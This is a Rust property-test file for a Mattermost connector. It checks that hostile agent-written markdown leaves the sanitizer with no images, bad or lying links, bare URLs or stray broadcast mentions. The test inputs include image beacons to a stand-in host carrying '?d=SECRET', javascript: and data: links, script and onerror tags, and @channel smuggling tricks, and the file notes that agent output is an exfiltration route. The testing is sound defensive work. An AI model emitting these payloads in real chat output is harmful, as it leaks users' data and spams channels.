//! FIX-142 review: hostile agent text through the whole outbound path — `markdown_chunks` →
//! `Content::agent_markdown` (`markdown_safe` + `@here`) → the Mattermost connector's
//! `render_text` — and the final post parsed the way Mattermost would read it (CommonMark/GFM
//! plus its `![alt](url =WxH)` image syntax and "definition interrupts a paragraph", both of
//! which start with `![`). Nothing after the sanitizer may produce what the sanitizer refuses.

use aurora_channels::Content;
use aurora_connector_mattermost::render::{Lookups, mention_refs, render_text};
use aurora_core::sanitize::markdown_chunks;
use proptest::prelude::*;
use pulldown_cmark::{Event, LinkType, Options, Parser, Tag, TagEnd};

fn opts() -> Options {
    Options::ENABLE_TABLES
        | Options::ENABLE_FOOTNOTES
        | Options::ENABLE_STRIKETHROUGH
        | Options::ENABLE_TASKLISTS
        | Options::ENABLE_MATH
        | Options::ENABLE_GFM
}

/// What the agent's text becomes on Mattermost, one string per post.
fn posts(raw: &str) -> Vec<String> {
    markdown_chunks(raw, 400)
        .into_iter()
        .map(|c| {
            let neutral = Content::agent_markdown(&c).text.unwrap_or_default();
            render_text(&neutral, &Lookups::default())
        })
        .collect()
}

/// A model of the pinned server's mention reading (Mattermost 11.7.15, measured through members'
/// `mention_count`, `docs/20 §Rendering`): outside code, `@name` where the name is `[A-Za-z0-9._-]`
/// without trailing `._-`, not after an ASCII letter/digit or `@`. Returns the lowercase names
/// that would notify more than one person: `channel`, `all`, `here` and `groups`.
fn live_pings(post: &str, groups: &[&str]) -> Vec<String> {
    let mut code: Vec<std::ops::Range<usize>> = Vec::new();
    for (e, r) in Parser::new_ext(post, opts()).into_offset_iter() {
        if matches!(e, Event::Code(_) | Event::Start(Tag::CodeBlock(_))) {
            code.push(r);
        }
    }
    let mut out = Vec::new();
    for (i, _) in post.match_indices('@') {
        if code.iter().any(|r| r.contains(&i)) {
            continue;
        }
        if post[..i]
            .chars()
            .next_back()
            .is_some_and(|c| c.is_ascii_alphanumeric() || c == '@')
        {
            continue;
        }
        let body = &post[i + 1..];
        let n = body
            .find(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-')))
            .unwrap_or(body.len());
        let name = body[..n]
            .trim_end_matches(['.', '_', '-'])
            .to_ascii_lowercase();
        // A word wrapped in backticks is code to the server whatever the parser makes of the
        // table cell around it (a row with more cells than its header loses the extras there).
        if post[..i].ends_with('`') && body[name.len()..].starts_with('`') {
            continue;
        }
        if matches!(name.as_str(), "channel" | "all" | "here") || groups.contains(&name.as_str()) {
            out.push(name);
        }
    }
    out
}

/// The posts of `raw` with, for each, how many `<@here>` the core produced (the allowed
/// broadcasts). The name lookup is modelled as the connector runs it: the names come from
/// `mention_refs` (the converted text included), those that are in `groups` are groups, those in
/// `known` are users, the rest are neither; `closed` is a lookup that failed.
fn posts_with(raw: &str, groups: &[&str], known: &[&str], closed: bool) -> Vec<(String, usize)> {
    markdown_chunks(raw, 400)
        .into_iter()
        .map(|c| {
            let neutral = Content::agent_markdown(&c).text.unwrap_or_default();
            let allowed = neutral.matches("<@here>").count();
            let names = mention_refs(&neutral).names;
            let lk = Lookups {
                groups: names
                    .iter()
                    .filter(|n| groups.contains(&n.as_str()))
                    .cloned()
                    .collect(),
                known: names
                    .iter()
                    .filter(|n| known.contains(&n.as_str()))
                    .cloned()
                    .collect(),
                closed,
                resolved: Some(names.into_iter().collect()),
                ..Lookups::default()
            };
            (render_text(&neutral, &lk), allowed)
        })
        .collect()
}

/// The first reason `post` is not safe, if any: an image (or an image opener) outside code, a
/// link that is not http/https/mailto.
fn violation(post: &str) -> Option<String> {
    // An image opener anywhere outside code, even where the parser shows nothing (the cells of a
    // table row beyond the header are dropped by GFM but rendered by Mattermost 11.7.15).
    {
        let code: Vec<std::ops::Range<usize>> = Parser::new_ext(post, opts())
            .into_offset_iter()
            .filter(|(e, _)| matches!(e, Event::Code(_) | Event::Start(Tag::CodeBlock(_))))
            .map(|(_, r)| r)
            .collect();
        // (`\![x](u)`: an escaped `!` in front of an ordinary link)
        if post.match_indices("![").any(|(i, _)| {
            !code.iter().any(|r| r.contains(&i))
                && post[..i].chars().rev().take_while(|c| *c == '\\').count() % 2 == 0
        }) {
            return Some("an image opener outside code".to_owned());
        }
    }
    // (D-270: an agent's text reaches Mattermost with no bare URL left.)
    if aurora_connector_mattermost::convert::has_bare_url(post) {
        return Some("a bare URL is left (the server would fetch it)".to_owned());
    }
    if !aurora_connector_mattermost::convert::is_safe(post) {
        return Some(
            "fails the last-line check (a link that lies about its host, or a bad link)".to_owned(),
        );
    }
    let mut in_code = false;
    for (e, r) in Parser::new_ext(post, opts()).into_offset_iter() {
        match e {
            Event::Start(Tag::CodeBlock(_)) => in_code = true,
            Event::End(TagEnd::CodeBlock) => in_code = false,
            Event::Start(Tag::Image { dest_url, .. }) => return Some(format!("image {dest_url}")),
            Event::Start(Tag::Link {
                dest_url,
                link_type,
                ..
            }) if !matches!(link_type, LinkType::Email) => {
                let l = dest_url.to_ascii_lowercase();
                if !(l.starts_with("http:") || l.starts_with("https:") || l.starts_with("mailto:"))
                {
                    return Some(format!("link {dest_url}"));
                }
            }
            Event::Text(_)
            | Event::InlineMath(_)
            | Event::DisplayMath(_)
            | Event::Html(_)
            | Event::InlineHtml(_)
                if !in_code && post[r.clone()].contains("![") =>
            {
                return Some(format!("image opener in {:?}", &post[r]));
            }
            _ => {}
        }
    }
    None
}

/// A live (undefused) `@here` outside code.
fn live_here(post: &str) -> bool {
    let mut in_code = false;
    for (e, _) in Parser::new_ext(post, opts()).into_offset_iter() {
        match e {
            Event::Start(Tag::CodeBlock(_)) => in_code = true,
            Event::End(TagEnd::CodeBlock) => in_code = false,
            Event::Text(t) if !in_code && t.to_ascii_lowercase().contains("@here") => return true,
            _ => {}
        }
    }
    false
}

const S: &str = "https://evil.example/?d=SECRET";

#[test]
fn the_reviewed_inputs_leave_no_image_and_no_bad_link() {
    let cases = [
        // D-270: a bare URL / autolink never reaches Mattermost as one.
        format!("see {S} now"),
        format!("<{S}>"),
        format!("<div>{S}</div>"),
        format!("!<a href=\"{S}\">x</a>"),
        format!("<div>\n![x]({S})\n</div>"),
        format!("<span>![x]({S})</span>"),
        format!("x<code>`![a]({S})`"),
        format!("<pre>\n```\n![x]({S})\n</pre>"),
        "<a href=\"https://ok.example\">x](javascript:alert(1))</a>".to_owned(),
        format!("see[^a]\n\n[^a]: note\n\n        ![x]({S})"),
        format!("$![x]({S})$"),
        format!("a $$![y]({S})$$ b"),
        // Mattermost-only image forms (finding 4).
        format!("![x]({S} =10x10)"),
        "![x](https://evil.example/a b)".to_owned(),
        format!("para\n[r]: {S}\n![x][r]"),
        // Re-review: links that lie about their host, in the forms Mattermost 11.7.15 links.
        "see[^a]\n\n[^a]: note\n\n        [https://cern.ch](https://evil.example/login)".to_owned(),
        "[https://cern.ch](https://evil.example/a b)".to_owned(),
        "para\n[r]: https://evil.example/login\n[https://cern.ch][r]".to_owned(),
        "[https://cern.ch](https://evil.example\\@cern.ch)".to_owned(),
        "[https://cern.ch](http:evil.example/login)".to_owned(),
        "<div>![x](u)</div>".to_owned(),
    ];
    for src in cases {
        for p in posts(&src) {
            assert_eq!(violation(&p), None, "{src:?} -> {p:?}");
        }
    }
}

/// FIX-182: an `<code>` pair whose text crosses a line break became one code span with a block
/// starter (`> `) inside it; the server reads the block first, the span never closes and the URL in
/// it is a bare URL the server fetches (D-270). A span never holds a line break now.
#[test]
fn a_code_pair_across_a_block_boundary_leaves_no_bare_url() {
    let url = "https://e.example/?d=SECRET";
    // The CI Watcher's minimal case (CI run 44535701452, proptest seed `cc 02af42e0…`).
    let ci = format!(
        "<div>\n![x]({url})\n</div> <code> see {url} now > [!NOTE]\n> n <code>@channel</code> <kbd>@all</kbd> <pre>@here</pre>"
    );
    // The CI Watcher's second case: a list-item boundary instead of a blockquote, and the
    // mentions broken up by empty tags must stay broken.
    let list = "<div>\n![x](https://e.example/?d=S)\n</div> <code> - https://e.example/1\n- <https://e.example/2> @chan<span></span>nel @al<i></i>l @he<code></code>re @d<kbd></kbd>evs".to_owned();
    for p in posts(&list) {
        assert!(
            violation(&p).is_none(),
            "{list:?} -> {p:?}: {:?}",
            violation(&p)
        );
        assert!(live_pings(&p, &["devs"]).is_empty(), "{list:?} -> {p:?}");
    }
    let mut cases = vec![ci, list];
    for starter in [
        "> q",
        "# h",
        "## h",
        "- i",
        "* i",
        "+ i",
        "1. i",
        "1) i",
        "| a |",
        "```",
        "~~~",
        "---",
        "===",
        "    indented",
        "    - nested",
        "[r]: https://e.example/",
        "<div>",
        "<!-- c -->",
        "$$",
        ":::",
        "[^1]: n",
        "* * *",
    ] {
        for open in ["<code>", "<kbd>", "<pre>"] {
            let close = open.replace('<', "</");
            cases.push(format!("a {open} see {url} now\n{starter} x {close} b"));
            cases.push(format!("a {open} see {url} now\n\n{starter} x {close} b"));
            cases.push(format!("{open}{url}\r\n{starter}\r\n{close}"));
        }
    }
    for src in &cases {
        for p in posts(src) {
            assert!(
                violation(&p).is_none(),
                "{src:?} -> {p:?}: {:?}",
                violation(&p)
            );
            assert!(
                !aurora_connector_mattermost::convert::has_bare_url(&p),
                "{src:?} -> {p:?}"
            );
        }
    }
    // An ordinary closed span stays a span, on one line.
    assert!(
        posts(&format!("a <code>{url}</code> b"))
            .iter()
            .all(|p| p.contains('`'))
    );
}

/// FIX-195 (D-270): an `<a href>` (or any tag with a URL in an attribute) leaves no bare URL
/// however it is nested — inside another anchor's label, in a table cell (also one beyond the
/// header's width, which GFM drops but Mattermost renders), a list item, a quote, a heading.
#[test]
fn a_nested_url_attribute_leaves_no_bare_url() {
    // The CI Watcher's minimal case (CI run 44731990142, proptest seed `cc 0bee1d64…`).
    let ci = "<a href=\"https://a.example\"> |a|b|\n|-|-|\n|1|![x](u)| <a href=\"https://a.example\">t</a> see https://e.example/?d=SECRET now </a>".to_owned();
    // The same 600-case proptest after the first fix: the label, read as a document of its own,
    // opened an HTML block whose text is escaped (the core's `[url](url)` became a bare URL).
    let block = "<a href=\"https://a.example\"> <details><summary>s</summary>b</details> see https://e.example/?d=SECRET now [ </a>".to_owned();
    let mut cases = vec![ci, block];
    for (pre, sep) in [("", "\n"), ("", "\n    "), ("> ", "\n> "), ("- ", "\n  ")] {
        for starter in [
            "<details>s</details>",
            "<div>d</div>",
            "<p>",
            "# h",
            "> q",
            "- i",
            "1. i",
            "```",
            "|a|b|\n|-|-|\n|1|2|3|",
            "[r]: https://e.example/r",
            "    code",
        ] {
            cases.push(format!(
                "{pre}<a href=\"https://o.example\">x{sep}{starter} see https://e.example/?d=S now{sep}<a href=\"https://p.example\">t</a> y</a>"
            ));
            cases.push(format!(
                "{pre}<a href=\"https://o.example\">{starter} see https://e.example/?d=S</a>"
            ));
        }
    }
    cases.push("see[^a]\n\n[^a]: <details>s</details> see https://e.example/?d=S".to_owned());
    cases.push("<a href=\"https://o.example\">a <p> b</a>".to_owned());
    let tags = [
        "<a href=\"https://a.example/t\">t</a>",
        "<a href=\"javascript:alert('https://a.example/j')\">t</a>",
        "<a href=\"data:text/html,https://a.example/d\">t</a>",
        "<img src=\"https://a.example/i.png\">",
        "<iframe src=\"https://a.example/f\"></iframe>",
        "<link href=\"https://a.example/l\">",
        "<area href=\"https://a.example/r\">",
        "<form action=\"https://a.example/p\"></form>",
    ];
    for t in tags {
        for pos in [
            // nested in an anchor
            format!("<a href=\"https://o.example\">x {t} y</a>"),
            format!("<a href=\"https://o.example\"><a href=\"https://p.example\">{t}</a></a>"),
            // a table cell, inside the header width and beyond it
            format!("|a|b|\n|-|-|\n|1|{t}|"),
            format!("|a|b|\n|-|-|\n|1|2|{t}|"),
            format!("a | b\n--|--\n1 | 2 | {t} | z"),
            // the same tables inside an anchor's label (the CI case's shape)
            format!("<a href=\"https://o.example\"> |a|b|\n|-|-|\n|1|2| {t} </a>"),
            format!("<a href=\"https://o.example\">x\n|a|b|\n|-|-|\n|1|2|3| {t} |</a>"),
            format!("> <a href=\"https://o.example\"> |a|b|\n> |-|-|\n> |1|2| {t} </a>"),
            // a list item, a quote, a heading, a footnote
            format!("- {t}\n- <a href=\"https://o.example\">{t}</a>"),
            format!("> {t}\n> <a href=\"https://o.example\">q {t}</a>"),
            format!("# {t}\n## <a href=\"https://o.example\">{t}</a>"),
            format!("see[^a]\n\n[^a]: note {t}"),
            format!("<div>\n{t}\n</div>"),
            format!("<table><tr><td>{t}</td></tr></table>"),
        ] {
            cases.push(pos);
        }
    }
    for src in &cases {
        for p in posts(src) {
            assert!(
                violation(&p).is_none(),
                "{src:?} -> {p:?}: {:?}",
                violation(&p)
            );
            assert!(
                !aurora_connector_mattermost::convert::has_bare_url(&p),
                "{src:?} -> {p:?}"
            );
        }
    }
    // An ordinary top-level link is unchanged.
    assert_eq!(
        posts("see <a href=\"https://x.example/p\">docs</a> now"),
        vec!["see [docs](https://x.example/p) now".to_owned()]
    );
}

#[test]
fn here_typed_in_code_never_goes_live_through_the_chunker() {
    let big: String = (0..40).map(|i| format!("    line {i} @here\n")).collect();
    let quote: String = (0..40)
        .map(|i| format!("> let v{i} = \"@here\";\n"))
        .collect();
    for src in [
        "    quoted mail: @here see ![x](https://evil.example/?d=S)".to_owned(),
        big,
        format!("> ```\n{quote}> ```"),
        "<code>@here</code> and `@here`".to_owned(),
        "```\n@here\n```".to_owned(),
    ] {
        for p in posts(&src) {
            assert!(!live_here(&p), "{src:?} -> {p:?}");
        }
    }
    // Prose `@here` still broadcasts.
    assert!(posts("ping @here now").iter().any(|p| live_here(p)));
}

fn fragments() -> impl Strategy<Value = String> {
    let frag = prop::sample::select(vec![
        "# h",
        "**b**",
        "`c`",
        "```rs\nlet x = 1;\n```",
        "> q",
        "- a",
        "    indented @here",
        "[l](https://a.example)",
        "[l](javascript:x)",
        "![i](https://a.example/p.png)",
        "<b>x</b>",
        "<b>",
        "</b>",
        "<code>",
        "</code>",
        "<kbd>",
        "<pre>",
        "</pre>",
        "<a href=\"https://a.example\">",
        "<a href=\"https://a.example\">t</a>",
        "</a>",
        "!<a href=\"https://a.example/p.png\">x</a>",
        "<div>\n![x](https://e.example/?d=S)\n</div>",
        "<details><summary>s</summary>b</details>",
        "<ul><li>a</li></ul>",
        "<table><tr><th>A</th></tr><tr><td>![x](u)</td></tr></table>",
        "$![x](https://e.example/?d=S)$",
        "$$![y](https://e.example/2)$$",
        "![x](https://e.example/p.png =10x10)",
        "para\n[r]: https://e.example/\n![x][r]",
        "[^1]\n\n[^1]: n",
        "[^1]\n\n[^1]: n\n\n        ![x](https://e.example/?d=S)",
        "> [!NOTE]\n> n",
        "@here",
        "@Channel. @ALL! (@all) _@channel_ **@here**",
        "\\@channel \\\\@all _@here",
        "[@channel](https://a.example) [x @all y][r]\n\n[r]: https://a.example/@here",
        "# @channel\n> @all\n- @here\n| @channel |",
        "@devs @Devs, **@DEVS** [@devs](https://a.example)",
        // Review 4: a name the connector's own HTML conversion joins.
        "ping @dev<span></span>s and @dev<sub>s</sub> and @de<b></b>vs",
        "@chan<span></span>nel @al<i></i>l @he<code></code>re @d<kbd></kbd>evs",
        "@dev<span></span>s.",
        "@alic<span></span>e @bo<b></b>b",
        "<code>@channel</code> <kbd>@all</kbd> <pre>@here</pre>",
        "<div>@channel</div> <b>@all</b>",
        "x@channel foo@all.example @channelx @channel.foo",
        "<code>@here</code>",
        "`@here`",
        "<@here>",
        "<@user:U1>",
        "[https://cern.ch](http:e.example/l)",
        "|a|b|\n|-|-|\n|1|2|![x](https://e.example/?d=S)|",
        "|a|b|\n|-|-|\n|1|2|https://e.example/?d=S @channel [x](javascript:alert(1))|",
        "a | b\n--|--\n1 | 2 | ![x](u) | @all",
        "see https://e.example/?d=SECRET now",
        "go www.e.example/?d=SECRET now (www.e.example)",
        "ftp://e.example/x and <www.e.example/y>",
        "<div>www.e.example/x</div> <b>ftp://e.example/y</b>",
        "| a |\n|---|\n| www.e.example/t | extra www.e.example/z |",
        "<https://e.example/?d=SECRET>",
        "- https://e.example/1\n- <https://e.example/2>",
        "<div>https://e.example/?d=S</div>",
        "<b>https://e.example/b</b> and <i>https://e.example/c</i>",
        "> quoted https://e.example/q",
        "# https://e.example/h",
        "| a |\n|---|\n| https://e.example/t |",
        "**https://e.example/s**",
        "[https://cern\\.ch](https://e.example/a b)",
        "[https://cern&#46;ch][r]\n\n[r]: https://e.example/",
        "x\n[r]: https://e.example/\n[https://cern.ch][r]",
        "[https://cern.ch\\]](https://e.example/a b)",
        "para\n[cern  ch]: https://e.example/login\n[https://cern.ch][cern ch]",
        "[https://cern.ch](https://e.example/a b)",
        "[https://cern.ch](https://e.example\\@cern.ch)",
        "para\n[r]: https://e.example/\n[https://cern.ch][r]",
        "[https://cern.ch]\n\n[https://cern.ch]: https://e.example/",
        "[^1]\n\n[^1]: n\n\n        [https://cern.ch](https://e.example/login)",
        "<!-- c -->",
        "<script>y</script>",
        "<img src=a onerror=b>",
        "|a|b|\n|-|-|\n|1|![x](u)|",
        "text",
        "\n",
        "  ",
        "`",
        "[",
        "]",
        "(",
        ")",
        "!",
    ]);
    prop::collection::vec(frag, 0..14).prop_map(|v| v.join(" "))
}

proptest! {
    #![proptest_config(ProptestConfig::with_cases(600))]

    #[test]
    fn hostile_text_reaches_mattermost_without_images_bad_links_or_code_broadcasts(
        s in prop_oneof![fragments(), any::<String>()]
    ) {
        for p in posts(&s) {
            prop_assert!(violation(&p).is_none(), "{:?} -> {p:?}: {:?}", s, violation(&p));
        }
    }

    /// D-271: no `@channel`/`@all`/group ping and no `@here` the core did not make, in any
    /// spelling the server reads as one, however the agent wrote it — with the name lookup
    /// answering (`devs` is a group) and with it failed (closed: no stranger's name passes).
    #[test]
    fn no_ping_reaches_mattermost_but_the_cores_here(
        s in prop_oneof![fragments(), any::<String>()]
    ) {
        for (p, allowed_here) in posts_with(&s, &["devs"], &["alice"], false) {
            let pings = live_pings(&p, &["devs"]);
            prop_assert!(
                pings.iter().all(|n| n == "here") && pings.len() <= allowed_here,
                "{s:?} -> {p:?}: {pings:?} (core made {allowed_here} <@here>)"
            );
        }
        for (p, allowed_here) in posts_with(&s, &["devs"], &["alice"], true) {
            let pings = live_pings(&p, &["devs", "stranger", "bob"]);
            prop_assert!(
                pings.iter().all(|n| n == "here") && pings.len() <= allowed_here,
                "closed: {s:?} -> {p:?}: {pings:?}"
            );
        }
    }

    /// Every `@here` of this input is in code, so none may be live after the whole path.
    #[test]
    fn here_in_code_never_broadcasts(
        n in 1usize..30,
        kind in 0u8..5,
        max in 60usize..400
    ) {
        let body = |p: &str| -> String { (0..n).map(|i| format!("{p}l{i} @here\n")).collect() };
        let src = match kind {
            0 => format!("```\n{}```\n", body("")),
            1 => format!("> ```\n{}> ```\n", body("> ")),
            2 => format!("- item\n- ```\n{}  ```\n", body("  ")),
            3 => body("    "),
            _ => format!("1. one\n\n{}", body("       ")),
        };
        for c in markdown_chunks(&src, max) {
            let neutral = Content::agent_markdown(&c).text.unwrap_or_default();
            let p = render_text(&neutral, &Lookups::default());
            prop_assert!(!live_here(&p), "{c:?} -> {p:?}");
        }
    }
}
